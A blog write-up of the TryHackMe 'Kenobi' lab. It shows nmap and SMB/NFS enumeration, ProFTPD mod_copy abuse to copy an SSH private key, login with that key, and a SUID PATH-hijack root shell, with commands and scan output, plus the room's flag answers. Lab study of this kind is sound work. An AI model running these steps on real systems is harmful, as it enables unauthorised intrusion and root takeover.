@@ -1,0 +1,140 @@
+<!doctype html><html lang=en-gb><head><title>TryHackMe Kenobi WriteUp // Dilan Goodwin</title><link rel="shortcut icon" href=/favicon.ico><meta charset=utf-8><meta name=generator content="Hugo 0.101.0"><meta name=viewport content="width=device-width,initial-scale=1"><meta name=author content="Dilan Goodwin"><meta name=description content="TryHackMe"><link rel=stylesheet href=https://dilangoodwin.github.io/css/main.min.4a7ec8660f9a44b08c4da97c5f2e31b1192df1d4d0322e65c0dbbc6ecb1b863f.css><meta name=twitter:card content="summary"><meta name=twitter:title content="TryHackMe Kenobi WriteUp"><meta name=twitter:description content="TryHackMe"><meta property="og:title" content="TryHackMe Kenobi WriteUp"><meta property="og:description" content="TryHackMe"><meta property="og:type" content="article"><meta property="og:url" content="https://dilangoodwin.github.io/WriteUps/TryHackMe/Kenobi/"><meta property="article:section" content="writeups"><meta property="article:published_time" content="2022-08-12T10:41:26+01:00"><meta property="article:modified_time" content="2022-08-12T10:41:26+01:00"></head><body><header class=app-header><a href=https://dilangoodwin.github.io/><img class=app-header-avatar src=/avatar.jpg alt="Dilan Goodwin"></a><h1>Dilan Goodwin</h1><nav class=app-header-menu><a class=app-header-menu-item href=/>Home</a>
+-
+<a class=app-header-menu-item href=/writeups>WriteUps</a></nav><p>University student within the UK studying Computer Science with an interest in Cyber Security.</p><div class=app-header-social><a href=https://github.com/DilanGoodwin target=_blank rel="noreferrer noopener"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-github"><title>GitHub</title><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37.0 00-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44.0 0020 4.77 5.07 5.07.0 0019.91 1S18.73.65 16 2.48a13.38 13.38.0 00-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07.0 005 4.77 5.44 5.44.0 003.5 8.55c0 5.42 3.3 6.61 6.44 7A3.37 3.37.0 009 18.13V22"/></svg></a></div></header><main class=app-container><article class=post><header class=post-header><h1 class=post-title>TryHackMe Kenobi WriteUp</h1><div class=post-meta><div><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar"><title>calendar</title><rect x="3" y="4" width="18" height="18" rx="2" ry="2"/><line x1="16" y1="2" x2="16" y2="6"/><line x1="8" y1="2" x2="8" y2="6"/><line x1="3" y1="10" x2="21" y2="10"/></svg>Aug 12, 2022</div><div><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock"><title>clock</title><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>10 min read</div><div><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tag"><title>tag</title><path d="M20.59 13.41l-7.17 7.17a2 2 0 01-2.83.0L2 12V2h10l8.59 8.59a2 2 0 010 2.82z"/><line x1="7" y1="7" x2="7.01" y2="7"/></svg><a class=tag href=https://dilangoodwin.github.io/tags/tryhackme/>TryHackMe</a>
+<a class=tag href=https://dilangoodwin.github.io/tags/writeup/>WriteUp</a>
+<a class=tag href=https://dilangoodwin.github.io/tags/nmap/>Nmap</a>
+<a class=tag href=https://dilangoodwin.github.io/tags/smb/>SMB</a>
+<a class=tag href=https://dilangoodwin.github.io/tags/privillegeescalation/>PrivillegeEscalation</a></div></div></header><div class=post-content><p><img src=/images/coverimages/Kenobi.png alt="Cover Image" title="TryHackMe Kenobi Room"></p><h1 id=tryhackme-kenobi-writeup>TryHackMe Kenobi WriteUp</h1><p>This is a write up of the Kenobi room in TryHackMe. It is a walk through on exploiting a Linux machine using:</p><ul><li><a href=https://www.samba.org>Samba</a> shares</li><li>Manipulate vulnerable version proftpd</li><li>Escalating privilleges path variable manipulation</li></ul><p>Before starting the room I went into my <code>Documents</code> folder on my virtual machine and created a folder called <code>Kenobi</code> to store files related to the room. Another thing I also did was connect to TryHackMe using the openVPN profile provided.</p><h2 id=task-1>Task 1</h2><p>Deploy the vulnerable machine</p><h3 id=question-1---no-answer-required>Question 1 - No answer required</h3><h3 id=question-2>Question 2</h3><p>Scan the machine with <a href=https://nmap.org>Nmap</a>, how many ports are open.</p><p><img src=/images/tryhackme/kenobi/01NmapScan.png alt="NmapScan Command: namp -sC -sV 10.10.188.52" title></p><p>Using nmap command <code>nmap -sC -sV 10.10.188.52</code> I scanned the machine for open ports. Once the scan had completed I piped the output to a file I called <code>NmapScan.txt</code> to my <code>Kenobi</code> directory. Looking at the results from the scan, right at the top is sats 993 ports closed. Knowing that by default nmap scans the first 1000 most common ports there are only 7 ports open.</p><p>Full command used: <code>nmap -sC -sV 10.10.188.52 > Documents/TryHackMe/Kenobi/NmapScan.txt</code></p><p>NmapScan.txt</p><pre tabindex=0><code>Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-09 14:18 BST
+Nmap scan report for 10.10.188.52
+Host is up (0.042s latency).
+Not shown: 993 closed tcp ports (conn-refused)
+PORT     STATE SERVICE     VERSION
+21/tcp   open  ftp         ProFTPD 1.3.5
+22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 b3:ad:83:41:49:e9:5d:16:8d:3b:0f:05:7b:e2:c0:ae (RSA)
+|   256 f8:27:7d:64:29:97:e6:f8:65:54:65:22:f7:c8:1d:8a (ECDSA)
+|_  256 5a:06:ed:eb:b6:56:7e:4c:01:dd:ea:bc:ba:fa:33:79 (ED25519)
+80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Site doesn&#39;t have a title (text/html).
+| http-robots.txt: 1 disallowed entry 
+|_/admin.html
+111/tcp  open  rpcbind     2-4 (RPC #100000)
+| rpcinfo: 
+|   program version    port/proto  service
+|   100000  2,3,4        111/tcp   rpcbind
+|   100000  2,3,4        111/udp   rpcbind
+|   100000  3,4          111/tcp6  rpcbind
+|   100000  3,4          111/udp6  rpcbind
+|   100003  2,3,4       2049/tcp   nfs
+|   100003  2,3,4       2049/tcp6  nfs
+|   100003  2,3,4       2049/udp   nfs
+|   100003  2,3,4       2049/udp6  nfs
+|   100005  1,2,3      40157/udp6  mountd
+|   100005  1,2,3      53254/udp   mountd
+|   100005  1,2,3      56941/tcp   mountd
+|   100005  1,2,3      59183/tcp6  mountd
+|   100021  1,3,4      42337/udp6  nlockmgr
+|   100021  1,3,4      46063/tcp   nlockmgr
+|   100021  1,3,4      46473/tcp6  nlockmgr
+|   100021  1,3,4      49565/udp   nlockmgr
+|   100227  2,3         2049/tcp   nfs_acl
+|   100227  2,3         2049/tcp6  nfs_acl
+|   100227  2,3         2049/udp   nfs_acl
+|_  100227  2,3         2049/udp6  nfs_acl
+139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
+2049/tcp open  nfs_acl     2-3 (RPC #100227)
+Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+|_clock-skew: mean: 1h39m59s, deviation: 2h53m12s, median: 0s
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled but not required
+|_nbstat: NetBIOS name: KENOBI, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)
+| smb2-time: 
+|   date: 2022-08-09T13:18:31
+|_  start_date: N/A
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb-os-discovery: 
+|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
+|   Computer name: kenobi
+|   NetBIOS computer name: KENOBI\x00
+|   Domain name: \x00
+|   FQDN: kenobi
+|_  System time: 2022-08-09T08:18:31-05:00
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 13.55 seconds
+</code></pre><p>Answer Task 1 Question 2: 7</p><h2 id=task-2>Task 2</h2><p>At the beginning of this task it talks about Samba shares and also gives you a command <code>nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse MACHINE_IP</code>.</p><h3 id=question-1>Question 1</h3><p>Using the nmap command above, how many shares have been found?</p><p><img src=/images/tryhackme/kenobi/03NmapSMB.png alt="Nmap SMB Scan nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.188.52"></p><p>Looking back at the first namp scan I can see that port 139 and 445 are open and responding. So using the command above, adding in the IP (<code>nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.188.52</code>) we can scan through the SMB shares that are on the machine.</p><p>Once again I ran the command and piped the output to a file within the <code>Kenobi</code> directory called <code>NmapSMB.txt</code>. Looking at the file there are 3 shares that it has found.</p><p>Full command used: <code>nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.188.52 > Documents/TryHackMe/Kenobi/NmapSMB.txt</code></p><p>NmapSMB.txt</p><pre tabindex=0><code>Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-09 14:25 BST
+Nmap scan report for 10.10.188.52
+Host is up (0.027s latency).
+
+PORT    STATE SERVICE
+445/tcp open  microsoft-ds
+
+Host script results:
+| smb-enum-shares: 
+|   account_used: guest
+|   \\10.10.188.52\IPC$: 
+|     Type: STYPE_IPC_HIDDEN
+|     Comment: IPC Service (kenobi server (Samba, Ubuntu))
+|     Users: 2
+|     Max Users: &lt;unlimited&gt;
+|     Path: C:\tmp
+|     Anonymous access: READ/WRITE
+|     Current user access: READ/WRITE
+|   \\10.10.188.52\anonymous: 
+|     Type: STYPE_DISKTREE
+|     Comment: 
+|     Users: 0
+|     Max Users: &lt;unlimited&gt;
+|     Path: C:\home\kenobi\share
+|     Anonymous access: READ/WRITE
+|     Current user access: READ/WRITE
+|   \\10.10.188.52\print$: 
+|     Type: STYPE_DISKTREE
+|     Comment: Printer Drivers
+|     Users: 0
+|     Max Users: &lt;unlimited&gt;
+|     Path: C:\var\lib\samba\printers
+|     Anonymous access: &lt;none&gt;
+|_    Current user access: &lt;none&gt;
+
+Nmap done: 1 IP address (1 host up) scanned in 4.41 seconds
+</code></pre><p>Answer Task 2 Question 1: 3</p><h3 id=question-2-1>Question 2</h3><p>Once you&rsquo;re connected, list the files on the share. What is the file you can see?</p><p><img src=/images/tryhackme/kenobi/04SMBConnect.png alt="smbclient connect SMB share smbclient //10.10.188.52/anonymous"></p><p>Out of the 3 shares that the scan found there is one called <code>anonymous</code> which we can try to connect to using the command <code>smbclient</code>.</p><p>Full command to connect is <code>smbclient //10.10.188.52/anonymous</code> without specifying a password. Once connected I ran the <code>ls</code> command and saw a single file called <code>log.txt</code>.</p><p>Answer Task 2 Question 2: log.txt</p><h3 id=question-3>Question 3</h3><p>What port is FTP running on?</p><p><img src=/images/tryhackme/kenobi/05SMBDownload.png alt="smbget download log.txt from SMB share smbget -R smb://10.10.188.52/anonymous"></p><p>Within the task it says that you can download the file using the command <code>smbget -R smb://&lt;ip>/anonymous</code> The <code>-R</code> within the command makes it recursive meaning it will download everything within the SMB share it connect to. In this case it will only download <code>log.txt</code> as it is the only file within the share.</p><p>The command downloads the file to whatever directory you are currently in, so to make sure I did not lose track of <code>log.txt</code> I moved it to the <code>kenobi</code> directory using the command <code>mv log.txt Documents/TryHackMe/Kenobi/</code>.</p><p>For this question though I did not look at the log file as the standard port for FTP is port 21. I could also have looked at the Nmap scan I ran earlier where it also tells us which port FTP is running on.</p><p>Answer Task 2 Question 3: 21</p><p>If you take a look in the log file it does say that FTP is running on port 21.</p><p><img src=/images/tryhackme/kenobi/18FTPPort.png alt="log.txt SMB port"></p><h3 id=question-4>Question 4</h3><p>What mount can we see?</p><p><img src=/images/tryhackme/kenobi/06NFSMountPoint.png alt="Nmap NFS scan nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.188.52"></p><p>This task once again provides us with a command that we can run within the terminal <code>nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount MACHINE_IP</code>. Copying the command into the terminal and adding in the machine IP, you see a single mount point.</p><p>Full command used: <code>nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.188.52 > Documents/TryHackMe/Kenobi/NmapNFS.txt</code></p><p>NmapNFS.txt</p><pre tabindex=0><code>Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-09 14:42 BST
+Nmap scan report for 10.10.188.52
+Host is up (0.054s latency).
+
+PORT    STATE SERVICE
+111/tcp open  rpcbind
+| nfs-showmount: 
+|_  /var *
+
+Nmap done: 1 IP address (1 host up) scanned in 0.45 seconds
+</code></pre><p>Answer Task 2 Question 4: /var</p><h2 id=task-3>Task 3</h2><h3 id=question-1-1>Question 1</h3><p>What is the version?</p><p>This questions asks us to use <a href=https://www.kali.org/tools/netcat/>NetCat</a> to connect to the machine using the FTP port (port 21). I am not very familiar with NetCat so did a quick Google on how to use it thinking that I need to add in arguments for the port, IP and a given service that I am trying to connect to but no. For NetCat to connect simply use the command <code>nc 10.10.188.52 21</code> (replace <code>10.10.188.52</code> with the IP address specific to the machine you are trying to access.)</p><p><img src=/images/tryhackme/kenobi/07NetCat.png alt="NetCat connect FTP nc 10.10.188.52 21"></p><p>Answer Task 3 Question 1: 1.3.5</p><h3 id=question-2-2>Question 2</h3><p>How many exploits are there for the ProFTPD running?</p><p><img src=/images/tryhackme/kenobi/08SearchSploit.png alt="SearchSploit ProFTPD 1.2.5 searchsploit ProFTPD 1.3.5"></p><p>There are 2 different ways that I can think of to approach this question. Number 1 is open a web browser, go to Exploit-DB, enter into the search field <code>ProFTPD Version 1.3.5</code> and count the number of result that are returned. Or number 2 is to use <a href=https://www.exploit-db.com/searchsploit>SearchSploit</a> which is effectively the same thing but within the terminal.</p><p>Entering <code>searchsploit ProFTPD 1.3.5</code> into the terminal should give you the required results. Once again I re-ran the command and saved the ouput to a file.</p><p>Full command used: <code>searchsploit ProFTPD 1.3.5 > Documents/TryHackMe/Kenobi/SearchSploit-ProFTPD.txt</code></p><p>SearchSploit-ProFTPD.txt</p><pre tabindex=0><code>---------------------------------------------------------------------- ---------------------------------
+Exploit Title                                                        |  Path
+---------------------------------------------------------------------- ---------------------------------
+[01;31m[KProFTPd[m[K [01;31m[K1.3.5[m[K - &#39;mod_copy&#39; Command Execution (Metasploit)             | linux/remote/37262.rb
+[01;31m[KProFTPd[m[K [01;31m[K1.3.5[m[K - &#39;mod_copy&#39; Remote Command Execution                   | linux/remote/36803.py
+[01;31m[KProFTPd[m[K [01;31m[K1.3.5[m[K - &#39;mod_copy&#39; Remote Command Execution (2)               | linux/remote/49908.py
+[01;31m[KProFTPd[m[K [01;31m[K1.3.5[m[K - File Copy                                             | linux/remote/36742.txt
+---------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+</code></pre><p>Answer Task 3 Question 2: 4</p><h3 id=question-3---no-answer-required>Question 3 - No Answer Required</h3><p>This question talk about the <code>mod_copy</code> exploit listed in the <code>SearchSploit-ProFTPD.txt</code> results. Any unauthenticated client can use the commands to copy files from any part of the system to a chosen destination.</p><h3 id=question-4---no-answer-required>Question 4 - No Answer Required</h3><p><img src=/images/tryhackme/kenobi/09NetCatMoveItem.png alt="NetCat move id_rsa key"></p><p>Here we implement what was talked about in question 3, using the commands to copy Kenobi&rsquo;s <code>id_rsa</code> ssh key to the <code>var/tmp</code> directory as we know that we can access the <code>/var</code> directory.</p><h3 id=question-5>Question 5</h3><p>What is Kenobi&rsquo;s user flag (/home/kenobi/user.txt)?</p><p>Using the commands within the question you can mount the directory and copy the <code>id_rsa</code> key that we just moved.</p><pre tabindex=0><code>mkdir /mnt/kenobiNFS
+mount 10.10.188.52:/var /mnt/kenobiNFS
+ls -al /mnt/kenobiNFS
+cp /mnt/kenobiNFS/tmp/id_rsa Documents/TryHackMe/Kenobi/id_rsa
+</code></pre><p><img src=/images/tryhackme/kenobi/10MntKenobi.png alt="Mounting kenobi var directory"></p><p>Once the <code>id_rsa</code> key has been copied onto our local machine, we have to get ownership of the key. Normally I would just <code>chmod 777 id_rsa</code> but because it is an ssh key if everyone on the computer has full access to it, it will not grant you connect. So instead you have to use <code>chmod 600 id_rsa</code>. Once we have ownership over the key we can use it to establish an ssh connection to the machine.</p><pre tabindex=0><code>sudo chmod 600 Documents/TryHackMe/Kenobi/id_rsa
+ssh -i Documents/TryHackMe/Kenobi/id_rsa kenobi@10.10.188.52
+</code></pre><p><img src=/images/tryhackme/kenobi/11CopySSH.png alt="Modifying permissions id_rsa key"></p><p>Now we are connected to the machine as Kenobi we can navigate to <code>/home/kenobi</code> and read <code>user.txt</code>.</p><p><code>cat user.txt</code></p><p>Answer Task 3 Question 5: d0b0f3f53b6caa532a83915e19224899</p><p><img src=/images/tryhackme/kenobi/13UserTXT.png alt=User.txt></p><h2 id=task-4>Task 4</h2><p>Now we are going to escalate from user permissions to root permissions because while Kenobi may have root access we do not know their password so cannot use <code>sudo</code>.</p><h3 id=question-1-2>Question 1</h3><p>What file looks particularly out of the ordinary?</p><p>Running the following command <code>find / -perm -u=s -type f 2>/dev/null</code> which will list a series of commands which are owned by root but can be run by Kenobi with using <code>sudo</code>.</p><p>Looking at the commands that were listed there were 2 that I noticed being slightly strange <code>/usr/bin/at</code> and <code>/usr/bin/menu</code>. As the question was asking for a work made of 4 letter it is not going to be <code>/usr/bin/at</code></p><p><img src=/images/tryhackme/kenobi/14SUID.png alt="SUID listed commands"></p><p>Answer Task 4 Question 1: /usr/bin/menu</p><p>Honestly I had to look up SUID to fully understand what the command was doing and I am still not 100% sure my explaination is correct. <a href=https://www.redhat.com/sysadmin/suid-sgid-sticky-bit>Linux permissions: SUID, SGID, and sticky bit</a></p><h3 id=question-2-3>Question 2</h3><p>Run the binary, how many options appear?</p><p>Running the command is as simple as entering its path into the terminal <code>/usr/bin/menu</code></p><p><img src=/images/tryhackme/kenobi/15MenuCommand.png alt="Running /usr/bin/menu"></p><p>Answer Task 4 Question 2: 3</p><h3 id=question-3---no-answer-required-1>Question 3 - No Answer Required</h3><p>Using <code>/usr/bin/menu</code> we are going to gain a root shell. All the commands for this are written within the task but I am going to reiterate them here just incase.</p><pre tabindex=0><code>echo /bin/sh &gt; curl
+chmod 777 curl
+export PATH=/tmp:$PATH
+/usr/bin/menu
+</code></pre><p><img src=/images/tryhackme/kenobi/16RootShell.png alt="Gaining Root shell"></p><p>Select option 1. Now you have a root shell. From here you can navigate to <code>/root/</code> and print out <code>root.txt</code></p><p>Answer Task 4 Question 4: 177b3cd8562289f37382721c28381f02</p><p><img src=/images/tryhackme/kenobi/17RootTXT.png alt=Root.txt></p><h2 id=summary>Summary</h2><p>With that last bit Kenobi is completed. While this room gave a lot of guidance on how to complete it there were still some bits that required a small amount of research. Looking back on how I approached some of the tasks there are a lot of things that I could have done differently and some of the commands that the room said to run could have been completely ignored (given my completely overkill Nmap scan at the start of tthe room) but it is a learning journey and I feel like I have learnt quite a bit.</p></div><div class=post-footer></div></article></main></body></html>
